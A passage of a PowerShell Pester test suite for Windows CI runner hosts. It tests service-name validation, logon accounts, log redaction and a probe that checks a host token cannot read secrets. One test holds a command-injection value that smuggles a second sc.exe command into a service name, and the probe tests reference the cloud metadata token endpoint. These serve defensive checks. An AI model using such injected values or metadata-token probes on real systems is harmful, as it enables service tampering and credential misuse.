    It 'omits labels entirely when there are none' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels '' -WorkPath '/w'
        $a | Should -Not -Contain '--labels'
    }

    It 'omits the runner group when there is none' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' -WorkPath '/w'
        $a | Should -Not -Contain '--runnergroup'
    }

    It 'passes the runner group when there is one' {
        $a = Get-RunnerConfigArgument -Owner 'o' -Repo 'r' -Name 'h-s1' -Labels 'x' `
            -WorkPath '/w' -RunnerGroup 'warm'
        $a[[array]::IndexOf($a, '--runnergroup') + 1] | Should -Be 'warm'
    }
}

Describe 'slot agent name' {
    # orphan_decision() on the controller parses this name back to an instance, so
    # a rename here silently un-reaps every Windows registration: the agent stays
    # in GitHub's list, the host it names is gone, and nothing notices.
    It 'is the instance name and the slot index' {
        Get-SlotAgentName -InstanceName 'ci-w-abcd' -Index 2 | Should -Be 'ci-w-abcd-s2'
    }

    It 'gives two slots on one host two different names' {
        (Get-SlotAgentName -InstanceName 'h' -Index 1) |
            Should -Not -Be (Get-SlotAgentName -InstanceName 'h' -Index 2)
    }
}

Describe 'runner service name' {
    # The marker file lives in a directory the slot account can write, and the
    # name reaches sc.exe. Anything not vouched for comes back '' and the caller
    # denies the boot -- refused, never escaped.
    It 'accepts the name config.cmd records' {
        Get-RunnerServiceName -Marker 'actions.runner.acme-infra.h-s1' -AgentName 'h-s1' |
            Should -Be 'actions.runner.acme-infra.h-s1'
    }

    It 'trims the trailing newline the marker file carries' {
        Get-RunnerServiceName -Marker "actions.runner.a.b`r`n" -AgentName 'b' |
            Should -Be 'actions.runner.a.b'
    }

    It 'refuses a name a slot could use to reach another service' {
        Get-RunnerServiceName -Marker 'actions.runner.a.b" delete "ci-beacon' -AgentName 'b' |
            Should -Be ''
    }

    It 'refuses a name that is not a runner service at all' {
        Get-RunnerServiceName -Marker 'ci-beacon' -AgentName 'ci-beacon' | Should -Be ''
    }

    It 'refuses an empty or missing marker' {
        Get-RunnerServiceName -Marker '' -AgentName 'h-s1' | Should -Be ''
        Get-RunnerServiceName -Marker '   ' -AgentName 'h-s1' | Should -Be ''
    }

    # Shape alone accepts any well-formed name. A stale or restored marker naming
    # a SIBLING slot's service would then get this slot's logon account, this
    # slot's environment block and this slot's recovery policy -- applied to an
    # agent that is already registered and running as somebody else.
    It 'refuses a well-formed name belonging to another slot' {
        Get-RunnerServiceName -Marker 'actions.runner.acme-infra.h-s2' -AgentName 'h-s1' |
            Should -Be ''
    }

    # Suffix, not substring. `h-s1` must not be satisfied by `...h-s11`, which is
    # a real neighbour on any host with ten or more slots.
    It 'refuses a longer agent name that merely ends with this one' {
        Get-RunnerServiceName -Marker 'actions.runner.acme-infra.h-s11' -AgentName 'h-s1' |
            Should -Be ''
    }
}

Describe 'service logon account' {
    # Four spellings of one local account. Rejecting three of them reports a
    # correctly configured service as a failed boot.
    It 'accepts every spelling the SCM uses for a local account' {
        Test-ServiceLogonAccount -StartName '.\ci-s1' -SlotUser 'ci-s1' | Should -BeTrue
        Test-ServiceLogonAccount -StartName 'WIN-ABC\ci-s1' -SlotUser 'ci-s1' | Should -BeTrue
        Test-ServiceLogonAccount -StartName 'ci-s1' -SlotUser 'ci-s1' | Should -BeTrue
        Test-ServiceLogonAccount -StartName '.\CI-S1' -SlotUser 'ci-s1' | Should -BeTrue
    }

    # THE THREE THIS FUNCTION EXISTS FOR. Each is machine-wide and shared by every
    # slot, and each is what the service runs as if the identity change did
    # nothing at all.
    It 'rejects each of the SCM defaults the identity change is meant to displace' {
        Test-ServiceLogonAccount -StartName 'LocalSystem' -SlotUser 'ci-s1' | Should -BeFalse
        Test-ServiceLogonAccount -StartName 'NT AUTHORITY\NetworkService' -SlotUser 'ci-s1' |
            Should -BeFalse
        Test-ServiceLogonAccount -StartName 'NT AUTHORITY\LocalService' -SlotUser 'ci-s1' |
            Should -BeFalse
    }

    It 'rejects a sibling slot, which is the other account on this host' {
        Test-ServiceLogonAccount -StartName '.\ci-s2' -SlotUser 'ci-s1' | Should -BeFalse
    }

    It 'reads an unreported account as not ours rather than as ours' {
        Test-ServiceLogonAccount -StartName '' -SlotUser 'ci-s1' | Should -BeFalse
        Test-ServiceLogonAccount -StartName $null -SlotUser 'ci-s1' | Should -BeFalse
    }
}

Describe 'boot logging stays out of the success stream' {
    # THIS IS THE ONE BLOCK IN THIS FILE THAT MUST NOT MOCK Write-BootLog.
    #
    # Every other impure test here does `Mock -CommandName Write-BootLog
    # -MockWith { }`, and that mock is exactly what hid a boot-fatal bug for the
    # life of this suite. Write-BootLog used `Write-Output`, which puts the line
    # on the SUCCESS stream, so every function that logged and then returned a
    # value returned an object[] of the log lines followed by the value:
    # Invoke-Phase0Preflight could not dot-source the beacon path it had just
    # captured, Register-SlotAgent's [string] -RegistrationToken received the
    # array space-joined into one string with a timestamped log line on the
    # front, and Invoke-Phase5Registration's [IDictionary] -Config would not
    # bind at all. Mocking the logger away makes every one of those disappear.
    #
    # So these cases RUN the real Write-BootLog and assert on the shape of what
    # a caller gets back. The bash gate (windows-host-startup.selftest.sh)
    # asserts the text; this asserts the behaviour, on the runtime, where the
    # array either is or is not there.
    BeforeEach {
        # The real path is C:\ci\ci-host.log, which does not exist on
        # ubuntu-latest -- Write-BootLog would swallow the failure and the test
        # would still be meaningful, but pointing it somewhere writable lets the
        # last case assert the file half is still doing its job.
        $script:LogPathBefore = $script:LogPath
        $script:LogPath = Join-Path ([System.IO.Path]::GetTempPath()) `
            ('ci-host-' + [guid]::NewGuid().ToString('N') + '.log')
    }

    AfterEach {
        Remove-Item -LiteralPath $script:LogPath -Force -ErrorAction SilentlyContinue
        $script:LogPath = $script:LogPathBefore
    }

    It 'lets a function that logs return its value as a scalar' {
        # The shape of Install-BeaconService: log, log, return a path. Phase 0
        # captures that path and dot-sources it, which an object[] cannot be.
        function Invoke-LogThenReturnPath {
            Write-BootLog 'shim: installed'
            Write-BootLog 'phase 0: beacon service running, interval 30s'
            return 'C:\ci\bin\ci-beacon.ps1'
        }

        $captured = Invoke-LogThenReturnPath
        @($captured).Count | Should -Be 1
        $captured | Should -BeOfType ([string])
        $captured | Should -Be 'C:\ci\bin\ci-beacon.ps1'
    }

    It 'hands a captured token to a [string] parameter with no log line joined to it' {
        # The shape of Wait-RegistrationToken into Register-SlotAgent. An
        # object[] bound to [string] is joined with spaces rather than refused,
        # which is why this failed silently: config.cmd got a real token with a
        # timestamped log line in front of it and reported an auth error.
        function Invoke-LogThenReturnToken {
            Write-BootLog 'phase 5: registration token present'
            return 'AABBCC112233'
        }
        function Test-TokenParameter {
            param([Parameter(Mandatory = $true)][string] $RegistrationToken)
            return $RegistrationToken
        }

        Test-TokenParameter -RegistrationToken (Invoke-LogThenReturnToken) |
            Should -Be 'AABBCC112233'
    }

    It 'returns a config that still binds to an [IDictionary] parameter' {
        # The shape of Invoke-Phase0Preflight into Invoke-Phase5Registration.
        # Member access such as $cfg.Slots survives the pollution by member
        # enumeration -- which is precisely why the fault read as working -- and
        # the parameter bind is where it actually stops.
        function Invoke-LogThenReturnConfig {
            Write-BootLog 'phase 0: preflight'
            Write-BootLog 'phase 0: image version 4 >= 1'
            Write-BootLog 'phase 0: ci/boot published'
            return [ordered] @{ Owner = 'owner'; Repo = 'repo' }
        }
        function Test-ConfigParameter {
            param([Parameter(Mandatory = $true)][System.Collections.IDictionary] $Config)
            return $Config.Owner
        }

        $cfg = Invoke-LogThenReturnConfig
        @($cfg).Count | Should -Be 1
        Test-ConfigParameter -Config $cfg | Should -Be 'owner'
    }

    It 'keeps a collected list of slot records free of log lines' {
        # The shape of Invoke-Phase1SlotSetup: a loop that appends one hash
        # table per slot while the callee logs. Polluted, the array carries
        # strings between the records, $_.User is $null for each of them, and
        # the phase 5 count is wrong on a host whose every log line says success.
        function Invoke-LogThenReturnRecord {
            param([int] $Index)
            Write-BootLog "phase 1: slot $Index provisioned as ci-s$Index"
            return @{ Index = $Index; User = "ci-s$Index" }
        }

        $collected = @()
        for ($i = 1; $i -le 3; $i++) { $collected += (Invoke-LogThenReturnRecord -Index $i) }
        $collected.Count | Should -Be 3
        # Joined rather than compared element-wise: a polluted array yields a
        # $null User for every log line it carries, and an empty segment in this
        # string is exactly what that looks like.
        (@($collected | ForEach-Object { $_.User }) -join ',') |
            Should -Be 'ci-s1,ci-s2,ci-s3'
    }

    It 'still writes the line to the boot log, and still survives losing it' {
        Write-BootLog 'phase 0: preflight'
        (Get-Content -Raw -LiteralPath $script:LogPath) | Should -Match 'phase 0: preflight'

        # The other half of Write-BootLog is deliberately unchanged: the log is
        # diagnostics, and losing it must never stop a boot. Restored afterwards
        # so AfterEach still cleans up the file the first half created.
        $writable = $script:LogPath
        try {
            $script:LogPath = Join-Path ([System.IO.Path]::GetTempPath()) `
                (Join-Path ('no-such-dir-' + [guid]::NewGuid().ToString('N')) 'ci-host.log')
            { Write-BootLog 'phase 0: preflight' } | Should -Not -Throw
        } finally {
            $script:LogPath = $writable
        }
    }
}

Describe 'boot log redaction' {
    It 'strikes the registration token out of a captured line' {
        Get-RedactedLine -Line 'config: --token AABBCC ok' -Secret 'AABBCC' |
            Should -Be 'config: --token *** ok'
    }

    # '' is a substring of every string. Redacting on it turns the whole boot log
    # into asterisks, which is how a failing boot stops being diagnosable.
    It 'leaves the line alone when there is no secret to strike' {
        Get-RedactedLine -Line 'config: authenticated' -Secret '' |
            Should -Be 'config: authenticated'
    }

    It 'strikes every occurrence, not just the first' {
        Get-RedactedLine -Line 'T=AABBCC retry T=AABBCC' -Secret 'AABBCC' |
            Should -Be 'T=*** retry T=***'
    }
}

Describe 'service environment block' {
    It 'renders each entry as NAME=VALUE' {
        $v = Get-ServiceEnvironmentValue -Environment ([ordered] @{ TMP = '/t'; TEMP = '/t' })
        $v | Should -Contain 'TMP=/t'
        $v.Count | Should -Be 2
    }

    # REG_MULTI_SZ is NUL-delimited: an embedded NUL does not corrupt the write,
    # it TRUNCATES the block there, and on this block the entries that would
    # disappear are the per-job credential reset hooks.
    It 'refuses a value carrying a NUL, which would truncate the block' {
        { Get-ServiceEnvironmentValue -Environment ([ordered] @{ TMP = "/t`0X=1" }) } | Should -Throw
    }

    It 'refuses a value carrying a newline' {
        { Get-ServiceEnvironmentValue -Environment ([ordered] @{ TMP = "/t`nX=1" }) } | Should -Throw
    }

    # The block is the last thing between instance metadata and a service that
    # starts as a local account, and section 3A accepts that a Windows host cannot
    # assume its metadata is untampered.
    It 'refuses a name that is not an environment variable name' {
        { Get-ServiceEnvironmentValue -Environment ([ordered] @{ 'TMP X' = '/t' }) } | Should -Throw
    }

    It 'carries the reset hooks straight through from the slot block' {
        $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '' -SlotRoot '/ci/slots'
        $v = Get-ServiceEnvironmentValue -Environment $block
        ($v -join "`n") | Should -Match 'ACTIONS_RUNNER_HOOK_JOB_COMPLETED='
    }
}

Describe 'negative capability' {
    # 403 is the only proof. Everything else is either the finding itself or an
    # unproved check, and both must fail the boot.
    It 'accepts a 403 and only a 403' {
        Test-NegativeCapability -StatusCode 403 | Should -BeTrue
        Test-NegativeCapability -StatusCode '403' | Should -BeTrue
    }

    It 'rejects a 200, which is the finding this phase exists to catch' {
        Test-NegativeCapability -StatusCode 200 | Should -BeFalse
    }

    # A probe whose token acquisition failed answers 401 to everything and would
    # otherwise report a perfect score.
    It 'rejects a 401, which says nothing about what the credential can do' {
        Test-NegativeCapability -StatusCode 401 | Should -BeFalse
    }

    It 'reads an unreachable endpoint as unproved rather than as proved' {
        Test-NegativeCapability -StatusCode $null | Should -BeFalse
        Test-NegativeCapability -StatusCode 'timeout' | Should -BeFalse
    }
}

Describe 'positive capability' {
    # The witness the negative checks do not have. Secret Manager answers 403
    # for a resource the caller may not read AND for one that does not exist,
    # so without one assertion running the other way the whole probe passes on
    # an identity that can do nothing at all.
    It 'accepts a 200 and only a 200' {
        Test-PositiveCapability -StatusCode 200 | Should -BeTrue
        Test-PositiveCapability -StatusCode '200' | Should -BeTrue
    }

    # Either the grant is gone -- no job on this host can get its credentials --
    # or everything this probe touched answers 403 for a reason unrelated to
    # IAM, in which case the two negative checks proved nothing.
    It 'rejects a 403, which is the finding' {
        Test-PositiveCapability -StatusCode 403 | Should -BeFalse
    }

    # The mirror of the negative rule, and it bites harder here: this check
    # exists to prove the measurement works, so accepting a failure to measure
    # would let it certify itself.
    It 'reads an unreachable endpoint or a credential-less call as unproved' {
        Test-PositiveCapability -StatusCode $null | Should -BeFalse
        Test-PositiveCapability -StatusCode 401 | Should -BeFalse
        Test-PositiveCapability -StatusCode 'timeout' | Should -BeFalse
    }
}

Describe 'probe verdict' {
    BeforeAll {
        $script:CleanProbe = {
            [pscustomobject] @{
                runningAs     = 'CI-HOST-ABCD\ci-s1'
                hostToken     = $true; secretStatus = 403; metricStatus = 403
                impersonateStatus = 200; impersonateAttempts = 1
                brokerEmail   = 'jobs@p.iam.gserviceaccount.com'
                siblingStatus = 'denied'; cacheWritable = $true; dnsResolved = $true
            }
        }
    }

    It 'passes a host that proved every property' {
        Get-ProbeFailure -Result (& $script:CleanProbe) `
            -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1' | Should -BeNullOrEmpty
    }

    # The case the whole function exists to get right: a service that never
    # started writes no file, and "no file" must not read as "no findings".
    It 'reports a missing verdict as a failure rather than as a pass' {
        $f = @(Get-ProbeFailure -Result $null -JobServiceAccount '' -ExpectedIdentity 'ci-s1')
        $f.Count | Should -Be 1
        $f[0] | Should -Match 'no verdict'
    }

    It 'fails a host whose identity can still read the App key' {
        $r = & $script:CleanProbe
        $r.secretStatus = 200
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'secretmanager'
    }

    It 'fails a host whose identity can still write the demand metric' {
        $r = & $script:CleanProbe
        $r.metricStatus = 200
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'timeSeries'
    }

    # Two perfect 401s are not two passes.
    It 'fails a probe that never obtained a host token, whatever else it reported' {
        $r = & $script:CleanProbe
        $r.hostToken = $false
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'could not obtain a host token'
    }

    # The failure the broker exists to prevent, and the one that looks most like
    # a working broker from every other angle.
    It 'fails a broker that fell back to the host identity' {
        $r = & $script:CleanProbe
        $r.brokerEmail = 'host@p.iam.gserviceaccount.com'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'vends'
    }

    It 'fails a broker that answered at all on a pool that configured none' {
        $r = & $script:CleanProbe
        # The impersonation fields are cleared so this test still fails when the
        # broker arm alone is broken: the drift arm below reports the SAME
        # 'configured no job service account' phrase, and with the shared
        # fixture's default 200 it would satisfy this assertion on its own.
        $r.impersonateStatus = $null
        $r.impersonateAttempts = $null
        (@(Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'a broker answered as'
    }

    It 'passes a no-broker pool that reported no broker' {
        $r = & $script:CleanProbe
        $r.brokerEmail = ''
        # A pool with no job service account has no impersonation to prove, and
        # Get-ProbeScript omits the call rather than disabling it -- so the
        # honest verdict from such a host carries no status at all.
        $r.impersonateStatus = $null
        $r.impersonateAttempts = $null
        Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1' | Should -BeNullOrEmpty
    }

    # THE VACUITY FIX (#157). Every other capability assertion is negative, and
    # 403 is what Secret Manager answers for a secret that is not there as well
    # as for one this host may not read -- so a host whose token can do nothing
    # at all scores a perfect boundary without this one.
    It 'fails a host whose token cannot mint the job credentials it is meant to' {
        $r = & $script:CleanProbe
        $r.impersonateStatus = 403
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'generateAccessToken'
    }

    # The sentence has to say WHY a missing capability invalidates the refusals
    # above it, or the next reader treats a positive control as a nice-to-have
    # and relaxes it to a warning on the first flaky boot.
    It 'says that a failed positive control voids the two refusals beside it' {
        $r = & $script:CleanProbe
        $r.impersonateStatus = 403
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'answers 403 to everything'
    }

    # Unproved is not proved, exactly as for the negative checks: a call that
    # never reached Google says nothing about what the token can do.
    It 'fails a positive control that could not be measured at all' {
        $r = & $script:CleanProbe
        $r.impersonateStatus = $null
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'generateAccessToken'
    }

    # The retry exists so a binding that is seconds old does not deny a boot,
    # which means the operator needs to know whether the grant was absent for
    # twenty seconds or was never there at all.
    It 'reports how many attempts the positive control was given' {
        $r = & $script:CleanProbe
        $r.impersonateStatus = 403
        $r.impersonateAttempts = 3
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'after 3 attempt'
    }

    # A status from a pool that configured no job service account means the
    # payload on disk is not the one this configuration builds -- the same
    # drift the broker arm refuses, and it must not read as a bonus pass.
    It 'fails a verdict that minted a job token on a pool with no job identity' {
        $r = & $script:CleanProbe
        $r.brokerEmail = ''
        (@(Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'not the one this configuration builds'
    }

    It 'fails a slot that could read a sibling workspace' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'allowed'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'another slot'
    }

    # The reviewer's case: Get-ChildItem throws identically on denied and on
    # absent, so a sibling workspace that had not been created yet would report
    # a proved ACL boundary if the payload folded the two together.
    It 'refuses to read an absent sibling workspace as a proved boundary' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'missing'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'never tested'
    }

    It 'reports any other sibling outcome as unproved' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'error'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'unproved'
    }

    # Which exception Windows PowerShell 5.1 raises for an ACL-denied
    # enumeration is UNOBSERVED on a real host, and the two candidates land in
    # opposite arms: UnauthorizedAccessException passes, ItemNotFoundException
    # denies the boot of every host in the pool. The finding therefore has to
    # carry the type, or the first host to fail tells the operator the boundary
    # is unproved and gives them nothing to prove it with.
    It 'names the exception behind an absent sibling workspace' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'missing'
        Add-Member -InputObject $r -NotePropertyName 'siblingErrorType' `
            -NotePropertyValue 'System.Management.Automation.ItemNotFoundException'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'ItemNotFoundException'
    }

    It 'names the exception behind any other sibling outcome' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'error'
        Add-Member -InputObject $r -NotePropertyName 'siblingErrorType' `
            -NotePropertyValue 'System.IO.IOException'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'System.IO.IOException'
    }

    # An empty field says so in words. "the exception was " with nothing after
    # it reads as a truncated log line, which is the one thing an operator
    # staring at a denied boot must not have to interpret.
    It 'says plainly when no exception type was recorded at all' {
        $r = & $script:CleanProbe
        $r.siblingStatus = 'missing'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'no exception was recorded'
    }

    # Service-account emails are canonically lowercase, so a case difference is
    # a different identity being passed off as the configured one.
    It 'holds the broker to the exact identity, case included' {
        $r = & $script:CleanProbe
        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'Jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'vends'
    }

    It 'fails an unwritable cache and an unresolvable name' {
        $r = & $script:CleanProbe
        $r.cacheWritable = $false
        $r.dnsResolved = $false
        @(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1').Count | Should -Be 2
    }

    # All of them, not the first. The operator gets one look at the serial
    # console before the controller reclaims the instance.
    It 'reports every reason at once' {
        $r = [pscustomobject] @{
            runningAs     = 'CI-HOST-ABCD\ci-s1'
            hostToken     = $false; secretStatus = 200; metricStatus = 200
            brokerEmail   = ''; siblingStatus = 'allowed'; cacheWritable = $false; dnsResolved = $false
        }
        @(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1').Count |
            Should -Be 8
    }

    # A verdict written by an older image lacks fields this one reads. Absent is
    # not true, and an unknown property must not throw its way past the gate.
    # SIX now, not five: a verdict with no runningAs is exactly the older-image
    # case, and an unattributed verdict is itself a finding.
    It 'treats an absent field as unproved rather than throwing' {
        $f = @(Get-ProbeFailure -Result ([pscustomobject] @{ hostToken = $true }) -JobServiceAccount '' -ExpectedIdentity 'ci-s1')
        $f.Count | Should -Be 6
    }

    # THE ONE THAT MAKES THE REPOINT FALSIFIABLE. Nothing else in the verdict
    # can tell these two runs apart: every other check queries the metadata
    # server, which answers the machine and not the account.
    It 'fails a verdict produced by LocalSystem rather than by the slot' {
        $r = & $script:CleanProbe
        $r.runningAs = 'NT AUTHORITY\SYSTEM'
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'never repointed'
    }

    It 'fails a verdict that does not say who produced it' {
        $r = & $script:CleanProbe
        $r.runningAs = ''
        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
            Should -Match 'did not report which account'
    }

    # The machine half of WindowsIdentity.Name is the instance name, which the
    # harness does not know and which says nothing about the boundary. Matching
    # on it would deny every real boot.
    It 'accepts the slot regardless of the machine prefix or case' {
        $r = & $script:CleanProbe
        $r.runningAs = 'SOME-OTHER-BOX\CI-S1'
        Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity '.\ci-s1' |
            Should -BeNullOrEmpty
    }
}

Describe 'jittered timeout' {
    # The failure mode of jitter is a bound that quietly became a constant, or
    # one that became unbounded. Both are invisible from a call site that rolls
    # its own dice, which is why the roll is a parameter.
    It 'never returns less than the base' {
        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 0.0 | Should -Be 600
    }

    It 'never exceeds base plus jitter' {
        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 1.0 | Should -Be 900
        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 0.5 | Should -Be 750
    }

    # Get-Random is documented as [0,1) but the clamp is not decoration: a caller
    # that hands this a ratio out of range must not widen the bound past what
    # the constant advertises.
    It 'clamps a roll outside zero-to-one' {
        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 7.5 | Should -Be 900
        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll -2.0 | Should -Be 600
    }

    It 'degenerates to the base when there is no jitter window' {
        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 0 -Roll 0.9 | Should -Be 600
    }
}

Describe 'probe payload' {
    BeforeAll {
        $script:Payload = Get-ProbeScript -SecretName 'app-key' `
            -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -BrokerEndpoint '127.0.0.1:8081' `
            -SiblingWorkspace 'C:\ci\slots\ci-s2\w' -CacheRoot 'C:\ci\slots\ci-s1\w' `
            -ResultPath 'C:\ci\boot-probe.json'
    }

    # The real metadata server, never the broker. The question is what a job can
    # reach behind the script's back; asking the broker would measure the
    # environment block instead of the identity.
    It 'spends a token minted by the real metadata server' {
        $script:Payload |
            Should -Match '169\.254\.169\.254/computeMetadata/v1/instance/service-accounts/default/token'
    }

    It 'tries both capabilities the reduction removed' {
        $script:Payload | Should -Match 'secretmanager\.googleapis\.com'
        $script:Payload | Should -Match 'monitoring\.googleapis\.com'
    }

    It 'names the secret it was told to try, not a placeholder' {
        $script:Payload | Should -Match 'secrets/app-key/versions/latest:access'
    }

    It 'reads the broker at the endpoint it was given' {
        $script:Payload | Should -Match 'http://127\.0\.0\.1:8081/computeMetadata'
    }

    # A payload that decides is a payload whose verdict came from the account
    # under test. It records; Get-ProbeFailure decides.
    It 'never denies a boot from inside the unprivileged payload' {
        $script:Payload | Should -Not -Match 'Deny-Boot'
    }

    It 'writes its verdict where the boot script looks for it' {
        $script:Payload | Should -Match "Set-Content -LiteralPath 'C:\\ci\\boot-probe\.json'"
    }

    # The sibling arm decides pass-or-deny from an exception type nobody has
    # observed on a real host, so it carries the type out with it. One catch,
    # not three: a typed catch that never fires records nothing, and "nothing
    # recorded" is indistinguishable from "the field was never added".
    It 'carries the concrete sibling exception type out in the verdict' {
        $script:Payload | Should -Match 'siblingErrorType'
        $script:Payload | Should -Match '\$_\.Exception\.GetType\(\)\.FullName'
    }

    # Without this the repoint has no witness: every other field in the verdict
    # is a metadata answer and reads identically for any account on the host.
    # Not $env:USERNAME -- a service's environment block is data the SCM copies
    # in and this script rewrites elsewhere, so it can disagree with the process
    # token, which is the exact divergence being tested for.
    It 'records the account it is actually running as' {
        $script:Payload | Should -Match 'WindowsIdentity\]::GetCurrent\(\)'

        # Comments stripped before the negative assertion, the same way code_of()
        # does it in the bash self-tests. The claim under test is that no code
        # path in the payload reads $env:USERNAME -- and the payload explains at
        # length why it does not, naming the variable to do so. Asserting over
        # the raw text makes that explanation the thing that fails, which would
        # push the next author to delete the reasoning to get the bar green.
        $code = ($script:Payload -split "`n" | Where-Object { $_ -notmatch '^\s*#' }) -join "`n"
        $code | Should -Not -Match '\$env:USERNAME'
    }

    It 'is valid PowerShell rather than merely a string' {
        { [scriptblock]::Create($script:Payload) } | Should -Not -Throw
    }

    It 'omits the broker read entirely when there is no broker' {
        $p = Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
            -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
        $p | Should -Not -Match 'service-accounts/default/email'
    }

    # The positive control, in the payload rather than in the verdict reader:
    # Get-ProbeFailure can only judge a status the payload actually went and
    # got, so a call that is not in the text is a check that never happened.
    It 'asks whether the host token can still mint the job credentials' {
        $script:Payload | Should -Match 'iamcredentials\.googleapis\.com'
        $script:Payload |
            Should -Match 'serviceAccounts/jobs@p\.iam\.gserviceaccount\.com:generateAccessToken'
    }

    # OMITTED, not disabled -- the same rule as the broker read. A pool with no
    # job identity has no impersonation to prove, and a runtime `if` would leave
    # the call in the text for somebody to later "simplify" the guard off.
    It 'omits the impersonation call entirely on a pool with no job identity' {
        $p = Get-ProbeScript -SecretName 'app-key' -JobServiceAccount '' -BrokerEndpoint '' `
            -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
        $p | Should -Not -Match 'iamcredentials'
    }

    # The response body is a live access token for the job service account. The
    # question asked is whether the call is PERMITTED, so the body must never be
    # bound to a variable, let alone written into the verdict file.
    It 'never keeps the token the positive control mints' {
        # One call, and it goes through Get-Status -- whose success path is
        # `$null = Invoke-WebRequest ...; return 200`, so the body is discarded
        # rather than bound. A second occurrence of the host would mean some
        # other statement is holding the response.
        $lines = @($script:Payload -split "`n" | Where-Object { $_ -match 'iamcredentials' })
        $lines.Count | Should -Be 1
        $lines[0] | Should -Match '^\s*-Uri '
        $script:Payload | Should -Match 'impersonateStatus = Get-Status'
    }

    # The source writes `$JobServiceAccount`:generateAccessToken inside a
    # double-quoted here-string. The backtick is REQUIRED and is consumed at
    # generation time: without it PowerShell reads $JobServiceAccount: as a
    # scope qualifier and interpolates the variable 'generateAccessToken' from
    # a scope named after the account, silently emitting a truncated URL. Read
    # in the source alone it looks like a stray escape leaking into a
    # single-quoted literal, and it has now been reported as one -- so assert
    # the EMITTED text, which is the only place the answer actually lives.
    It 'emits a plain colon before the generateAccessToken verb' {
        $script:Payload | Should -Match ([regex]::Escape('.iam.gserviceaccount.com:generateAccessToken'))
        $script:Payload | Should -Not -Match ([regex]::Escape('`:generateAccessToken'))
    }

    # A binding created seconds ago by the same apply that created the pool is
    # not always in force yet, and this is the only assertion in the payload
    # whose subject is an IAM binding. Without the retry the first boot after a
    # fresh apply denies itself and `keep:at-floor` pins that host at min_hosts.
    It 'gives the positive control a bounded retry the other checks do not get' {
        $script:Payload | Should -Match 'for \(\$i = 1; \$i -le 3; \$i\+\+\)'
        $script:Payload | Should -Match 'Start-Sleep -Seconds 10'
        $script:Payload | Should -Match 'impersonateAttempts'
    }
}

Describe 'probe literal safety' {
    # Everything Get-ProbeScript interpolates becomes code in a payload that
    # runs holding a live host token, and the secret name and broker endpoint
    # both arrive from instance metadata -- which section 3A says outright is
    # writable by anything holding the machine's identity.
    It 'accepts the shapes the pool actually produces' {
        Test-ProbeLiteral -Value 'ci-app-key' -Kind 'name' | Should -BeTrue
